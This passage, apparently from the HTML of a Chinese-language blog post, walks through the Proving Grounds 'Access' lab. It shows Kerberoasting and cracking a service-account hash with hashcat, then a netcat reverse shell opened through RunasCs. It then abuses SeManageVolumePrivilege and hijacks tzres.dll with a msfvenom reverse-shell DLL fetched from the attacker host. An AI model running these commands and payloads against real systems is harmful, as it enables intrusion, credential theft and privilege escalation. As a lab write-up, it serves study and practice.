+</span></span><span class="line"><span class="cl">028165312F9D575F2189828715749CABD5AD9308D4BE166A4B3B3736ECFEC98367F0E43E93DE1E498F86AF3E8AB9B446
+</span></span><span class="line"><span class="cl">3448467DCBD60E25B8051656976F5D1B9DFCB02D3FABC7B1578FEC8570B4D606E6EADCC8A0BA80C9F2C1F2B395F46A2E
+</span></span><span class="line"><span class="cl">98008B02B42DABEF1800C3264B7BE558FFFF96FDC93D9133166124308C0CD7548827E217821ED41C05C1904665C711F9
+</span></span><span class="line"><span class="cl">E21C964A98A94D2568EF863542259C31B36457D146B93FAA8B682E48C49B1281C54D56051406869FE8683DF28D38A5BD
+</span></span><span class="line"><span class="cl">48503640ABBEB4AF5DDDA28046377D80D8A018D38E50EC925FD845838EFA60D34AA29E4BC1A1B0B54A8929546C9DC642
+</span></span><span class="line"><span class="cl">866C34ED547590237A04DE24E76D774467A7F42836C5ED87D9A50E0C7C225B7F107F16135CE4063507BC8B9DA72AD454
+</span></span><span class="line"><span class="cl">92FBFC6E37B946A0D66D109D4C41923D174B63F3AB9C41B2F8DFD814B0B01C9178B48C0C851FD623E8FEAB6FCC83BCF7
+</span></span><span class="line"><span class="cl">358C87BF4D3CAABF382DFB4E660116DA8604CFD0C83847064DF06CF15479583E7D108552E5E914DD6DBB12CA6AE6561B
+</span></span><span class="line"><span class="cl">85F54A84ECBD92CA3C64EA8D27D80904E5FB0554B7FC04A3C49A237BB12D7D22D5384C1A7A7F81E1C8CC22A9C9C860F4
+</span></span><span class="line"><span class="cl">F66D4F469FDD8D02752E547A604627EA2C1CE1110D7F4B5BA374DF19E5CD003F7F9ACEBCD65346276503E304D98E952A
+</span></span><span class="line"><span class="cl">2ACE9586F012BDAB4DAB26A176A93B0F82CA65A7D39175DC2A9F14BD8B6B9079AE1324E0A64CF24539A616012773C0E3
+</span></span><span class="line"><span class="cl">214C62366F1F4FE67508262DD9402DB08A93B8485C3E61E843788517AD4B70A937667585493540EE55837097DA324686
+</span></span><span class="line"><span class="cl">EA8AE61DAA9F6B4CB4AA98D2E870DEFEB33DD2BFBE0C7758E57EB3C10F08B67484339CB877C327B63A1D37E5FDFD9478
+</span></span><span class="line"><span class="cl">35BCBB3B24A742C64CF98316B20C14973A8A32C61A739E7B0C40D59777C2BE502E79AC51571E9A1E3A8F9AC8BB8B024D
+</span></span><span class="line"><span class="cl">742106656D1F4CBA5D5C7DB50D2EFA204A50ABC665F6BB86B1DC18F9A8C3E4F7413BFCB2B504F6C353709CE120885AD6
+</span></span><span class="line"><span class="cl">2A7A11F22D2F4B95A7B2D8ADE89F25A344CE6E85B4A1E33072D43A7838A25DCBFFC7110E559C15D54C39BC4BD287387A
+</span></span><span class="line"><span class="cl">C4099BF18D926CD464F9A4F2927DA5944360A8ECB1CC5998AF1017554E58CCE2E1BEDBD4A0BC4DEAEB97F914BA05B184
+</span></span><span class="line"><span class="cl">D522ACA5FA8FEF3F5DAC9D71C1E0C7A8E72AD7D98C114C156A05D695AC5CDBEFAD407BB65FBFE8955E58C4DE0519EBBA
+</span></span><span class="line"><span class="cl">102F46241BD2C3EE053FF2E5D78493CDF75CC113CF3FC3A72E0B22F24D9845385A8613C5E30DA408D7095806607EBD04
+</span></span><span class="line"><span class="cl">797BF7FE35EB5AF096B0A144D92B103C9FB30F150C2EEFAC49737DEBF38B781822E39409BCFF12657F2E1CFDB0DA7168
+</span></span><span class="line"><span class="cl">EFA2DD9CB42D6694C4FF65AEC36E529E4DD06E66384E7AEF3AF37A9F45DC9DCC99C57F5E94A36661517037FBC81FEF72
+</span></span><span class="line"><span class="cl">81940B899A369EC5EC91804161EDA0B3E4BA39E7957A85027DB3825FA0AA490B74514
+</span></span><span class="line"><span class="cl">SamAccountName       : svc_mssql
+</span></span><span class="line"><span class="cl">DistinguishedName    : <span class="nv">CN</span><span class="o">=</span>MSSQL,CN<span class="o">=</span>Users,DC<span class="o">=</span>access,DC<span class="o">=</span>offsec
+</span></span><span class="line"><span class="cl">ServicePrincipalName : MSSQLSvc/DC.access.offsec</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png" alt="image-20240112015440644" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png?size=large 2x" data-title="image-20240112015440644" style="--width: 2318px;--aspect-ratio: 2318 / 1112;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="crack-hash" class="heading-element"><span>Crack Hash</span>
+  <a href="#crack-hash" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>整理hash格式写入文件</p>
+<p>使用hashcat进行破解</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hashcat -m <span class="m">13100</span> mssql.hash /usr/share/wordlists/rockyou.txt  --force -a <span class="m">0</span> --show
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>svc_mssql<span class="nv">$access</span>.offsec<span class="nv">$MSSQLSvc</span>/DC.access.offsec*<span class="nv">$600077</span>adcf96e989d8c9a8d1ae325f08<span class="nv">$a0da4c8a4c76eb098a4567bbca91c9883eaa1f35c75428cee9f738d9044a5f0f41153b51832da55e14097c267ea14bf88a9861e14500a2e1e3d8e95269fd34fea33a40eff9658e40c8dadfdd868d17a49bdcd72575bbf060267b0f4f7617bff028165312f9d575f2189828715749cabd5ad9308d4be166a4b3b3736ecfec98367f0e43e93de1e498f86af3e8ab9b4463448467dcbd60e25b8051656976f5d1b9dfcb02d3fabc7b1578fec8570b4d606e6eadcc8a0ba80c9f2c1f2b395f46a2e98008b02b42dabef1800c3264b7be558ffff96fdc93d9133166124308c0cd7548827e217821ed41c05c1904665c711f9e21c964a98a94d2568ef863542259c31b36457d146b93faa8b682e48c49b1281c54d56051406869fe8683df28d38a5bd48503640abbeb4af5ddda28046377d80d8a018d38e50ec925fd845838efa60d34aa29e4bc1a1b0b54a8929546c9dc642866c34ed547590237a04de24e76d774467a7f42836c5ed87d9a50e0c7c225b7f107f16135ce4063507bc8b9da72ad45492fbfc6e37b946a0d66d109d4c41923d174b63f3ab9c41b2f8dfd814b0b01c9178b48c0c851fd623e8feab6fcc83bcf7358c87bf4d3caabf382dfb4e660116da8604cfd0c83847064df06cf15479583e7d108552e5e914dd6dbb12ca6ae6561b85f54a84ecbd92ca3c64ea8d27d80904e5fb0554b7fc04a3c49a237bb12d7d22d5384c1a7a7f81e1c8cc22a9c9c860f4f66d4f469fdd8d02752e547a604627ea2c1ce1110d7f4b5ba374df19e5cd003f7f9acebcd65346276503e304d98e952a2ace9586f012bdab4dab26a176a93b0f82ca65a7d39175dc2a9f14bd8b6b9079ae1324e0a64cf24539a616012773c0e3214c62366f1f4fe67508262dd9402db08a93b8485c3e61e843788517ad4b70a937667585493540ee55837097da324686ea8ae61daa9f6b4cb4aa98d2e870defeb33dd2bfbe0c7758e57eb3c10f08b67484339cb877c327b63a1d37e5fdfd947835bcbb3b24a742c64cf98316b20c14973a8a32c61a739e7b0c40d59777c2be502e79ac51571e9a1e3a8f9ac8bb8b024d742106656d1f4cba5d5c7db50d2efa204a50abc665f6bb86b1dc18f9a8c3e4f7413bfcb2b504f6c353709ce120885ad62a7a11f22d2f4b95a7b2d8ade89f25a344ce6e85b4a1e33072d43a7838a25dcbffc7110e559c15d54c39bc4bd287387ac4099bf18d926cd464f9a4f2927da5944360a8ecb1cc5998af1017554e58cce2e1bedbd4a0bc4deaeb97f914ba05b184d522aca5fa8fef3f5dac9d71c1e0c7a8e72ad7d98c114c156a05d695ac5cdbefad407bb65fbfe8955e58c4de0519ebba102f46241bd2c3ee053ff2e5d78493cdf75cc113cf3fc3a72e0b22f24d9845385a8613c5e30da408d7095806607ebd04797bf7fe35eb5af096b0a144d92b103c9fb30f150c2eefac49737debf38b781822e39409bcff12657f2e1cfdb0da7168efa2dd9cb42d6694c4ff65aec36e529e4dd06e66384e7aef3af37a9f45dc9dcc99c57f5e94a36661517037fbc81fef7281940b899a369ec5ec91804161eda0b3e4ba39e7957a85027db3825fa0aa490b74514</span>:trustno1</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="runascs" class="heading-element"><span>RunasCs</span>
+  <a href="#runascs" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>接下去需要获取mssql身份的反弹shell，可以使用&quot;<a href="https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1"target="_blank" rel="external nofollow noopener noreferrer">Invoke-RunasCs.ps1</a>&ldquo;这个脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; curl https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1
+</span></span><span class="line"><span class="cl">curl https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\t</span>mp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a----        1/11/2024   8:50 AM         <span class="m">498700</span> 1.txt
+</span></span><span class="line"><span class="cl">-a----        1/11/2024   9:06 AM              <span class="m">0</span> 2.txt
+</span></span><span class="line"><span class="cl">-a----        1/11/2024   9:38 AM            <span class="m">883</span> Get-SPN.ps1
+</span></span><span class="line"><span class="cl">-a----        1/11/2024   9:46 AM          <span class="m">46818</span> Invoke-Kerberoast.ps1
+</span></span><span class="line"><span class="cl">-a----        1/11/2024  10:09 AM          <span class="m">88284</span> Invoke-RunasCs.ps1
+</span></span><span class="line"><span class="cl">-a----        1/11/2024   8:45 AM          <span class="m">43696</span> nc.exe
+</span></span><span class="line"><span class="cl">-a----        1/11/2024   8:49 AM        <span class="m">2029568</span> winPEASany.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; import-module ./Invoke-RunasCs.ps1
+</span></span><span class="line"><span class="cl">import-module ./Invoke-RunasCs.ps1
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command <span class="s2">&#34;whoami&#34;</span>
+</span></span><span class="line"><span class="cl">Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command <span class="s2">&#34;whoami&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Warning: The logon <span class="k">for</span> user <span class="s1">&#39;svc_mssql&#39;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="s1">&#39;8&#39;</span> to obtain a more privileged token.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">access<span class="se">\s</span>vc_mssql
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command <span class="s2">&#34;C:\tmp\nc.exe 192.168.45.169 7777 -e powershell&#34;</span>
+</span></span><span class="line"><span class="cl">Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command <span class="s2">&#34;C:\tmp\nc.exe 192.168.45.169 7777 -e powershell&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Warning: The logon <span class="k">for</span> user <span class="s1">&#39;svc_mssql&#39;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="s1">&#39;8&#39;</span> to obtain a more privileged token.</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png" alt="image-20240112021350288" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png?size=large 2x" data-title="image-20240112021350288" style="--width: 1624px;--aspect-ratio: 1624 / 1070;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd</span> C:<span class="se">\u</span>sers<span class="se">\s</span>vc_mssql<span class="se">\D</span>esktop<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nb">cd</span> C:<span class="se">\u</span>sers<span class="se">\s</span>vc_mssql<span class="se">\D</span>esktop<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>PS C:<span class="se">\u</span>sers<span class="se">\s</span>vc_mssql<span class="se">\D</span>esktop&gt; cat local.txt
+</span></span><span class="line"><span class="cl">cat local.txt
+</span></span><span class="line"><span class="cl">ac7cd92298a3ec65de98ea4c51f9e95e</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="prive-1" class="heading-element"><span>PrivE</span>
+  <a href="#prive-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>再次进行信息搜集</p>
+<p>发现当前用户权限如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; whoami /priv
+</span></span><span class="line"><span class="cl">whoami /priv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                Description                      <span class="nv">State</span>   
+</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">================================</span> <span class="o">========</span>
+</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain       Disabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
+</span></span><span class="line"><span class="cl">SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>   Disabled</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中<code>SeManageVolumePrivilege</code>权限可被用于提权，相关链接：https://github.com/xct/SeManageVolumeAbuse</p>
+<p>需要用vs stuido手动编译一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; curl http://192.168.45.169/SeManageVolumeAbuse.exe -o SeManageVolumeAbuse.exe
+</span></span><span class="line"><span class="cl">curl http://192.168.45.169/SeManageVolumeAbuse.exe -o SeManageVolumeAbuse.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; ./SeManageVolumeAbuse.exe
+</span></span><span class="line"><span class="cl">./SeManageVolumeAbuse.exe
+</span></span><span class="line"><span class="cl">Success! Permissions changed.
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; icacls C:/windows
+</span></span><span class="line"><span class="cl">icacls C:/windows
+</span></span><span class="line"><span class="cl">C:/windows NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>M<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>M<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>RX<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           CREATOR OWNER:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>RX<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>RX<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Successfully processed <span class="m">1</span> files<span class="p">;</span> Failed processing <span class="m">0</span> files
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; </span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下去要上传 tzres.dll到 C:\Windows\System32\wbem\tzres.dll，再通过systeminfo命令去触发它</p>
+<p>使用msfvenom生成一个64位反弹shell的dll文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.45.169 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll -o tzres.dll 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
+</span></span><span class="line"><span class="cl">Final size of dll file: <span class="m">9216</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: tzres.dll</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; curl http://192.168.45.169/tzres.dll -o tzres.dll                                                                          
+</span></span><span class="line"><span class="cl">curl http://192.168.45.169/tzres.dll -o tzres.dll                                                                                     
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; cp tzres.dll C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\w</span>bem<span class="se">\t</span>zres.dll
+</span></span><span class="line"><span class="cl">cp tzres.dll C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\w</span>bem<span class="se">\t</span>zres.dll
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; systeminfo &gt; 5.txt
+</span></span><span class="line"><span class="cl">systeminfo &gt; 5.txt
+</span></span><span class="line"><span class="cl">systeminfo : ERROR: The remote procedure call failed.
+</span></span><span class="line"><span class="cl">At line:1 char:1
+</span></span><span class="line"><span class="cl">+ systeminfo &gt; 5.txt
+</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~
+</span></span><span class="line"><span class="cl">    + CategoryInfo          : NotSpecified: <span class="o">(</span>ERROR: The remote procedure call failed.:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
+</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : NativeCommandError
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; </span></span></code></pre></td></tr></table>
+</div>
+</div><p>收到反弹shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.169<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.167.187<span class="o">]</span> <span class="m">50960</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.2746<span class="o">]</span>
